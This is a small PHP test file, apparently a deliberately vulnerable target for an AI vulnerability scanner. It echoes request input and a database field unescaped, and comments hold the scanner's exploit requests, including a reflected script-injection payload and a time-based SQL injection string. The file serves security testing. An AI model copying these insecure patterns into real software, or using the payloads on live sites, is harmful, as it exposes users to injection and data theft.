<?php
$id = htmlspecialchars(mysql_real_escape_string($_REQUEST['id']));
$user_id = $_REQUEST['user_id'];
//VERIFY: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, ad2a0e0b
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
echo "Message for user_id = $user_id and message_id = $message_id";
if(isset($id) && isset($user_id))
{
	//FIXED: AI SQL issue #156, High, SQL Injection, https://github.com/userwithrepo/ACSI_S4/issues/156, d0695575
	//AI exploit:
	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=1&id=%27+or+sleep%285%29+%3D+%271 HTTP/1.1
	//Host: localhost
	//Accept-Encoding: identity
	//Connection: close
	$res = mysql_query("SELECT * FROM messages WHERE msg_id = '$id'") or die(mysql_error());
	$res = mysql_fetch_assoc($res);
	//VERIFY: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, 05f7e6a3
	//AI exploit:
	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1 HTTP/1.1
	//Host: localhost
	//Accept-Encoding: identity
	//Connection: close
	echo "Message for user_id = $user_id and message_id = $message_id";
	//FP: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, 0768da97
	//AI exploit:
	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=1&id=1 HTTP/1.1
	//Host: localhost
	//Accept-Encoding: identity
	//Connection: close
	echo "<div>$res[body]</div>";
}
?>
